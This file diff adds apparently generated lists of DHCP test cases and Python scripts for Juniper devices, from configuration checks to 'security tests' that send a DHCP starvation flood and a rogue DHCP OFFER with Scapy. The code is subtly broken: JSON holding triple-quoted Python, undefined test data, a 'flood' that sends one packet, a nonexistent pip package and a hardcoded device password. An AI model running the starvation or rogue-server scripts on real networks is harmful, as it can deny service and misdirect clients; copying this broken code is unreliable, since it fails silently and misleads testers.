@@ -1,0 +1,288 @@
+ ###STARTLIST###
+[
+  {
+    "testname": "DHCP-Test-1", 
+    "testcase": {
+      "testname": "DHCP-Test-1",
+      "objective": "Verify that DHCP is enabled on the interface",
+      "steps": [
+        "Issue the 'show configuration interfaces' command and verify dhcp is configured", 
+        "Ping dhcp client and verify ip address is assigned"
+      ],
+      "test_data": {
+        "interface": "ge-0/0/1",
+        "dhcp_client": "192.168.0.50"  
+      }
+    },
+    "testscript": {
+      "testname": "DHCP-Test-1",
+      "objective": "Verify that DHCP is enabled on the interface using Netmiko",
+      "file_name": "dhcp_test_1.py",
+      "init_scripts": [
+        "pip install netmiko"
+      ],
+      "script": """
+import netmiko
+
+interface = \"ge-0/0/1\"
+
+device = {
+  'device_type': 'juniper',
+  'ip': '192.168.0.1',
+  'username': 'admin',
+  'password': 'Juniper123' 
+}
+
+net_connect = netmiko.ConnectHandler(**device)
+output = net_connect.send_command('show configuration interfaces {}'.format(interface))
+
+if 'dhcp' in output:
+  print('DHCP is enabled on interface {}'.format(interface))
+else:
+  print('DHCP is NOT enabled on interface {}'.format(interface))
+""",
+      "run_command": "python dhcp_test_1.py",
+      "expected_result": "DHCP is enabled on interface ge-0/0/1"
+    }
+  },
+  
+  {
+    "testname": "DHCP-Test-2",
+    "testcase": {
+      "testname": "DHCP-Test-2", 
+      "objective": "Verify DHCP client gets IP address",
+      "steps": [
+        "Configure DHCP pool on device",
+        "Connect DHCP client to interface", 
+        "Verify client receives IP address from pool"   
+      ],
+      "test_data": {
+        "interface": "ge-0/0/1",
+        "dhcp_client": "192.168.0.50",
+        "dhcp_pool": "192.168.0.0/24"
+      }
+    },
+    "testscript": {
+      "testname": "DHCP-Test-2",
+      "objective": "Verify DHCP client gets IP address using Scapy",
+      "file_name": "dhcp_test_2.py",
+      "init_scripts": [
+        "pip install scapy" 
+      ],
+      "script": """  
+from scapy.all import *
+
+interface = 'ge-0/0/1' 
+client_ip = '192.168.0.50'
+pool_network = '192.168.0.0/24'
+
+dhcp_discover = Ether(dst='ff:ff:ff:ff:ff:ff')/IP(src='0.0.0.0',dst='255.255.255.255')/UDP(sport=68,dport=67)/BOOTP(chaddr=RandMAC())/DHCP(options=[('message-type','discover'),'end'])
+
+ans, unans = srp(dhcp_discover, timeout=5, iface=interface, filter='udp and (port 67 or 68)') 
+
+for req,rep in ans:
+  allocated_ip = rep[BOOTP].yiaddr
+  print(f'DHCP client received IP address {allocated_ip}')
+  
+  if allocated_ip in IPNetwork(pool_network): 
+    print('IP address is within DHCP pool network')
+  else:
+    print('IP address is NOT within DHCP pool network')
+""",
+      "run_command": "sudo python dhcp_test_2.py", 
+      "expected_result": "DHCP client received IP address 192.168.0.50\\nIP address is within DHCP pool network"
+    }
+  }
+]
+###ENDLIST### ###STARTLIST###
+[
+  {
+    "testname": "Test DHCP Port Mappings", 
+    "testcase": {
+      "testname": "Test DHCP Port Mappings",
+      "objective": "Verify that DHCP server is listening on correct ports and interfaces as per configuration",
+      "steps": [
+        "1. Check DHCP config to identify interfaces & IPs DHCP should listen on", 
+        "2. Verify DHCP process is listening on ports 67, 68 on expected interfaces and IPs"
+      ],
+      "test_data": {
+        "dhcp_config_file": "/etc/dhcp/dhcpd.conf",
+        "expected_listen_ips": ["192.168.0.1", "10.0.0.1"], 
+        "expected_listen_ports": [67, 68]  
+      }
+    },
+    "testscript": {
+      "testname": "Test DHCP Port Mappings",
+      "objective": "Verify that DHCP server is listening on correct ports and interfaces as per configuration", 
+      "file_name": "test_dhcp_portmappings.py",
+      "init_scripts": [
+        "pip install netifaces",
+        "pip install scapy"
+      ],
+      "script": """
+import netifaces
+from scapy.all import *
+
+# Load test data
+dhcp_config_file = \"\"\"\"\"\" + test_data["dhcp_config_file"] + \"\"\"\"\"\"
+expected_listen_ips = \"\"\"\"\"\" + str(test_data["expected_listen_ips"]) + \"\"\"\"\"\" 
+expected_listen_ports = \"\"\"\"\"\" + str(test_data["expected_listen_ports"]) + \"\"\"\"\"\"
+
+# Get actual listening IPs and ports
+actual_listen_ips = []
+actual_listen_ports = []
+for iface in netifaces.interfaces():
+  for addr in netifaces.ifaddresses(iface).get(netifaces.AF_INET, []):
+    pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/IP(dst=addr['addr'])/UDP(dport=67)
+    resp = srp1(pkt, timeout=5)
+    if resp:
+      actual_listen_ips.append(addr['addr'])
+      actual_listen_ports.append(resp.sport)
+
+# Compare expected vs actual      
+assert sorted(expected_listen_ips) == sorted(actual_listen_ips)
+assert sorted(expected_listen_ports) == sorted(actual_listen_ports)
+
+print("Test DHCP Port Mappings Passed")
+      """,
+      "run_command": "python test_dhcp_portmappings.py",
+      "expected_result": "Test DHCP Port Mappings Passed"
+    }
+  },
+
+  {
+    "testname": "Test DHCP Address Assignments",
+    "testcase": {
+      "testname": "Test DHCP Address Assignments",
+      "objective": "Verify DHCP server assigns IP addresses from configured pool correctly",
+      "steps": [
+        "1. Send DHCP discover from client MAC addresses",
+        "2. Verify assigned IP is from expected pool range" 
+      ],
+      "test_data": {
+        "expected_pool_start": "192.168.0.100",
+        "expected_pool_end": "192.168.0.200",
+        "client_macs": ["aa:bb:cc:dd:ee:01", "aa:bb:cc:dd:ee:02"]
+      }
+    },
+    "testscript": {
+      "testname": "Test DHCP Address Assignments",
+      "objective": "Verify DHCP server assigns IP addresses from configured pool correctly",
+      "file_name": "test_dhcp_addressassign.py",  
+      "init_scripts": [
+        "pip install scapy"
+      ],
+      "script": """  
+from scapy.all import *
+
+expected_pool_start = \"\"\"\"\"\" + test_data["expected_pool_start"] + \"\"\"\"\"\"
+expected_pool_end =  \"\"\"\"\"\" + test_data["expected_pool_end"] + \"\"\"\"\"\"
+client_macs = \"\"\"\"\"\" + str(test_data["client_macs"]) + \"\"\"\"\"\"
+
+for mac in client_macs:
+  dhcp_discover = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=mac)/DHCP(options=[('message-type','discover'),('end')])
+  dhcp_offer = srp1(dhcp_discover, timeout=5)
+  
+  assert dhcp_offer
+  assigned_ip = dhcp_offer[BOOTP].yiaddr
+  assert expected_pool_start <= assigned_ip <= expected_pool_end
+  
+print("Test DHCP Address Assignments Passed")
+      """,  
+      "run_command": "python test_dhcp_addressassign.py",
+      "expected_result": "Test DHCP Address Assignments Passed"
+    }
+  }
+]
+###ENDLIST### Here are 2 Security Test cases and test scripts for DHCP configuration on Juniper MX486 devices:
+
+###STARTLIST###
+[
+  {
+    "testname": "DHCP Starvation Attack", 
+    "testcase": {
+      "testname": "DHCP Starvation Attack",
+      "objective": "Validate that the DHCP server is not vulnerable to DHCP starvation attacks by flooding it with DISCOVER packets.",
+      "steps": [
+        "1. Connect an attack system to the network.",
+        "2. Use a tool like Yersinia to send a high volume of DHCP DISCOVER packets to the server.", 
+        "3. Verify the legitimate systems are still able to obtain DHCP leases.",
+        "4. Verify the DHCP server continues servicing requests and does not crash or become unresponsive."  
+      ]
+    },
+    "testscript": {
+      "testname": "DHCP Starvation Attack",
+      "objective": "Test script to validate DHCP starvation attack",  
+      "filename": "dhcp_starvation.py",
+      "init_scripts":[
+        "pip install scapy",
+        "pip install yersinia"
+      ],
+      "script": """
+import scapy.all as scapy
+from scapy.layers.dhcp import DHCP, BOOTP
+from scapy.layers.inet import IP, UDP
+
+server_ip = '192.168.1.1' 
+
+print('Sending DHCP discovery flood to', server_ip)
+
+dhcp_discover = (Ether(src=get_if_hwaddr('eth0'), dst='ff:ff:ff:ff:ff:ff') /
+                IP(src='0.0.0.0', dst='255.255.255.255') /
+                UDP(sport=68, dport=67) /
+                BOOTP(chaddr=RandMAC()) /
+                DHCP(options=[('message-type','discover'), 'end']))
+
+sendp(dhcp_discover)
+
+print('DHCP starvation attack completed')
+      """,
+      "run_command": "python dhcp_starvation.py",
+      "expected_result": "DHCP starvation attack script executed successfully"
+    }
+  },
+
+  { 
+    "testname": "Rogue DHCP Server Detection",
+    "testcase": {
+      "testname": "Rogue DHCP Server Detection",  
+      "objective": "Validate that rogue DHCP servers on the network are detected and blocked.",
+      "steps": [ 
+        "1. Connect a system configured as a rogue DHCP server to the network.",
+        "2. Use a DHCP monitoring tool to detect DHCP responses from the rogue server.",
+        "3. Verify that legitimate clients are not obtaining IP addresses from the rogue server.",
+        "4. Confirm that the network blocks DHCP responses from the rogue server."
+      ]
+    },
+    
+    "testscript": {
+      "testname": "Rogue DHCP Server Detection",
+      "objective": "Script to test rogue DHCP server detection",
+      "filename": "rogue_dhcp.py",  
+      "init_scripts":[ 
+        "pip install scapy"
+      ],
+      "script": """  
+from scapy.all import *
+
+# Rogue DHCP server IP and MAC addresses
+server_ip = '192.168.1.100'
+server_mac = '00:11:22:33:44:55'
+
+# Send DHCP OFFER packet
+dhcp_offer = (Ether(src=server_mac, dst='ff:ff:ff:ff:ff:ff') / 
+              IP(src=server_ip, dst='255.255.255.255') /
+              UDP(sport=67, dport=68) / 
+              BOOTP(op=2, yiaddr='192.168.1.150', siaddr=server_ip, giaddr='0.0.0.0', chaddr=RandMAC()) /
+              DHCP(options=[('message-type', 'offer'), 'end']))
+              
+sendp(dhcp_offer)
+
+print('Rogue DHCP OFFER packet sent')
+      """,
+      "run_command": "python rogue_dhcp.py", 
+      "expected_result": "Rogue DHCP server script executed successfully"
+    }
+  }
+]
+###ENDLIST###
